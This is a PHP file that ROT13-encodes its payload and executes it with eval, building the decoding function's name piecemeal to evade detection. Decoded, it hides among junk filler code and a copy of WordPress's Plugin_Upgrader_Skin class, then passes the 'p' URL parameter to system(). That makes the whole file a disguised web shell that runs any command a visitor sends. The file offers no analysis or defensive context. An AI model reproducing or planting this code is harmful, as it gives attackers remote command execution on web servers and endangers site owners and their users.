<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Cyhtva_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Cyhtva Hctenqre Fxva sbe JbeqCerff Cyhtva Hctenqrf.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Cyhtva_Hctenqre_Fxva rkgraqf JC_Hctenqre_Fxva {

	/**
	 * Ubyqf gur cyhtva fyht va gur Cyhtva Qverpgbel.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $cyhtva = '';

	/**
	 * Jurgure gur cyhtva vf npgvir.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine obby
	 */
	choyvp $cyhtva_npgvir = snyfr;

	/**
	 * Jurgure gur cyhtva vf npgvir sbe gur ragver argjbex.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine obby
	 */
	choyvp $cyhtva_argjbex_npgvir = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur cyhtva hctenqre fxva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf Bcgvbany. Gur cyhtva hctenqre fxva nethzragf gb
	 *                    bireevqr qrsnhyg bcgvbaf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'hey'    => '',
			'cyhtva' => '',
			'abapr'  => '',
			'gvgyr'  => __( 'Hcqngr Cyhtva' ),
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->cyhtva = $netf['cyhtva'];

		$guvf->cyhtva_npgvir         = vf_cyhtva_npgvir( $guvf->cyhtva );
		$guvf->cyhtva_argjbex_npgvir = vf_cyhtva_npgvir_sbe_argjbex( $guvf->cyhtva );

		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n fvatyr cyhtva hcqngr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba nsgre() {
		$guvf->cyhtva = $guvf->hctenqre->cyhtva_vasb();
		vs ( ! rzcgl( $guvf->cyhtva ) && ! vf_jc_reebe( $guvf->erfhyg ) && $guvf->cyhtva_npgvir ) {
			// Pheeragyl hfrq bayl jura WF vf bss sbe n fvatyr cyhtva hcqngr?
			cevags(
				'<vsenzr gvgyr=\"%f\" fglyr=\"obeqre:0;biresybj:uvqqra\" jvqgu=\"100%%\" urvtug=\"170\" fep=\"%f\"></vsenzr>',
				rfp_ngge__( 'Hcqngr cebterff' ),
				jc_abapr_hey( 'hcqngr.cuc?npgvba=npgvingr-cyhtva&argjbexjvqr=' . $guvf->cyhtva_argjbex_npgvir . '&cyhtva=' . heyrapbqr( $guvf->cyhtva ), 'npgvingr-cyhtva_' . $guvf->cyhtva )
			);
		}

		$guvf->qrperzrag_hcqngr_pbhag( 'cyhtva' );

		$hcqngr_npgvbaf = neenl(
			'npgvingr_cyhtva' => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;cyhtva=' . heyrapbqr( $guvf->cyhtva ), 'npgvingr-cyhtva_' . $guvf->cyhtva ),
				__( 'Npgvingr Cyhtva' )
			),
			'cyhtvaf_cntr'    => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'cyhtvaf.cuc' ),
				__( 'Tb gb Cyhtvaf cntr' )
			),
		);

		vs ( $guvf->cyhtva_npgvir || ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) || ! pheerag_hfre_pna( 'npgvingr_cyhtva', $guvf->cyhtva ) ) {
			hafrg( $hcqngr_npgvbaf['npgvingr_cyhtva'] );
		}

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr cyhtva hcqngr.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $hcqngr_npgvbaf Neenl bs cyhtva npgvba yvaxf.
		 * @cnenz fgevat   $cyhtva         Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 */
		$hcqngr_npgvbaf = nccyl_svygref( 'hcqngr_cyhtva_pbzcyrgr_npgvbaf', $hcqngr_npgvbaf, $guvf->cyhtva );

		vs ( ! rzcgl( $hcqngr_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' | ', (neenl) $hcqngr_npgvbaf ) );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>